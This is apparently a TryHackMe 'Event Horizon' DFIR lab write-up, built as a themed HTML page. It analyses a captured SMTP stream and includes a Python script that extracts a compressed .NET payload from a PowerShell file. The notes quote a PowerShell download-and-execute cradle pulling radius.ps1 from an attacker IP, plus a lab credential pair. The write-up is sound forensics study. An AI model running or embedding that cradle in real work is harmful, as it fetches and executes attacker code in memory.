@@ -1,0 +1,141 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Event Horizon &mdash; Breach Reconstruction Log</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=VT323&family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/terminal-theme.css">
+<style>
+  .shot{ margin:1.2rem 0 1.6rem; }
+  .shot img{ max-width:100%; border:1px solid var(--border-dim); border-radius:4px; display:block; }
+  .badge-row{ display:flex; flex-wrap:wrap; gap:.5rem; justify-content:center; margin-top:1rem; }
+  .badge-row span{ font-size:11px; letter-spacing:.08em; text-transform:uppercase; color:var(--green-dim); border:1px solid var(--border); padding:.25rem .6rem; border-radius:20px; }
+</style>
+</head>
+<body class="flicker">
+<div class="crt-overlay" aria-hidden="true"></div>
+
+<div class="terminal-shell">
+
+  <header class="term-titlebar">
+    <div class="dots"><span></span><span></span><span></span></div>
+    <a href="../index.html" style="border:none;color:var(--green-dim);flex-shrink:0;">&larr; ./home</a>
+    <div class="term-path">root@eventhorizon:~/thm#</div>
+    <div class="term-status"><span class="dot-live" aria-hidden="true"></span> SESSION ACTIVE</div>
+  </header>
+
+  <section class="hero" id="top">
+    <p class="hero-eyebrow">thm log</p>
+    <div class="hero-frame">
+      <h1>EVENT HORIZON<small>TryHackMe · DFIR</small></h1>
+    </div>
+    <div class="hero-meta">
+      <span>PLATFORM <b>TryHackMe</b></span>
+      <span>ROOM <b>Event Horizon</b></span>
+      <span>CATEGORY <b>DFIR</b></span>
+    </div>
+    <div class="badge-row"><span>thm</span> <span>dfir</span> <span>powershell</span> <span>smtp</span></div>
+    <a class="scroll-cue" href="#f0">&#9660; scroll to begin</a>
+  </section>
+
+  <div class="layout">
+    <nav class="sidenav" aria-label="Section navigation">
+      <div class="nav-prompt">┌──(reader@you)-[~]
+└─$ ls -la sections/</div>
+      <ul id="navList">
+        <li><a href="#f0">01_investigation.md</a></li>
+        <li><a href="#f1">02_script.py</a></li>
+      </ul>
+    </nav>
+
+    <main class="content">
+      
+      
+      <section id="f0" class="block">
+        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
+└─$ <span class="cmd">cat 01_investigation.md</span></div>
+        <h2>investigation notes</h2>
+        <div class="block-body"><p>filterd for smtp and followed a tcp stream i found a base64 at the end that had a powershell command one liner IEX(New-Object Net.WebClient).downloadString('http://10.0.2.45/radius.ps1') The command creates a Net.WebClient(used to send and receive data using http). The command downloads the contents of radius.ps1 being served in attacker's ip 10.0.2.45. It executes the downloaded data in memory using IEX(Invoke Expression)-the script is never saved in disk it executes after being downloaded.</p></div>
+<div class="block-body"><p>tom.dom@eventhorizon.thm:password dom.mark@eventhorizon.thm</p></div>
+<figure class="shot"><img width="1919" height="489" alt="image" src="https://github.com/user-attachments/assets/fa3687c9-0a9f-4761-b305-4cd395e6887e" /></figure>
+<figure class="shot"><img width="1275" height="797" alt="image" src="https://github.com/user-attachments/assets/86f88982-cf9f-4a81-9389-3a5c078a3c25" /></figure>
+<figure class="shot"><img width="1093" height="771" alt="image" src="https://github.com/user-attachments/assets/ebc13801-1254-48ca-8471-907fa6cdc7b6" /></figure>
+<div class="block-body"><p>script.py reads the powershell file, extracts base64 blob, decodes it from base64, decompresses it(deflate), saves the raw .NET assembly(DLL/EXE) to disk so it can be inspected<br>virustotal.com</p></div>
+<figure class="shot"><img width="805" height="142" alt="image" src="https://github.com/user-attachments/assets/a1bcb22e-a1e4-490d-a4fe-4ac29d3b324e" /></figure>
+<figure class="shot"><img width="1740" height="745" alt="image" src="https://github.com/user-attachments/assets/fb535389-1f0c-40a3-9277-66074731ce18" /></figure>
+
+      </section>
+      <section id="f1" class="block">
+        <div class="prompt-header">┌──(operator@kali)-[~/writeup]
+└─$ <span class="cmd">cat 02_script.py</span></div>
+        <h2>supporting script</h2>
+        <pre><code>import re
+import base64
+import zlib
+
+# Path to your radius.ps1
+ps1_file = "radius.ps1"
+
+# Read the file
+with open(ps1_file, "r", encoding="utf-8") as f:
+    content = f.read()
+
+# Step 1: Extract the Base64 string inside [Convert]::FromBase64String('...')
+match = re.search(r"FromBase64String\('([^']+)'\)", content)
+if not match:
+    raise ValueError("Base64 string not found in PowerShell script.")
+b64_data = match.group(1)
+
+# Step 2: Decode from Base64
+compressed_data = base64.b64decode(b64_data)
+
+# Step 3: Decompress (Deflate)
+# In .NET DeflateStream = raw zlib DEFLATE without zlib headers in some cases.
+# The 'wbits=-15' tells zlib to expect raw DEFLATE data.
+decompressed_data = zlib.decompress(compressed_data, wbits=-15)
+
+# Step 4: Save the decompressed .NET assembly to disk
+output_file = "radius_payload.exe"
+with open(output_file, "wb") as f:
+    f.write(decompressed_data)
+
+print(f"[+] Extracted payload saved to {output_file}")</code></pre>
+
+      </section>
+    </main>
+  </div>
+
+  <footer class="term-footer">
+    <div class="prompt-header">┌──(operator@kali)-[~/writeup]
+└─$ <span class="cursor">&#9612;</span></div>
+    <p>Raw session log, lightly reformatted for the theme. Nothing paraphrased or added beyond what's in the original notes.</p>
+  </footer>
+
+</div>
+
+<script>
+(function(){
+  var links = Array.prototype.slice.call(document.querySelectorAll('#navList a'));
+  var sections = links.map(function(a){ return document.querySelector(a.getAttribute('href')); }).filter(Boolean);
+  if ('IntersectionObserver' in window && sections.length){
+    var map = {};
+    sections.forEach(function(s, idx){ map[s.id] = links[idx]; });
+    var obs = new IntersectionObserver(function(entries){
+      entries.forEach(function(entry){
+        var link = map[entry.target.id];
+        if (!link) return;
+        if (entry.isIntersecting){
+          links.forEach(function(l){ l.classList.remove('active'); });
+          link.classList.add('active');
+        }
+      });
+    }, { rootMargin: '-15% 0px -70% 0px', threshold: 0 });
+    sections.forEach(function(s){ obs.observe(s); });
+  }
+})();
+</script>
+</body>
+</html>
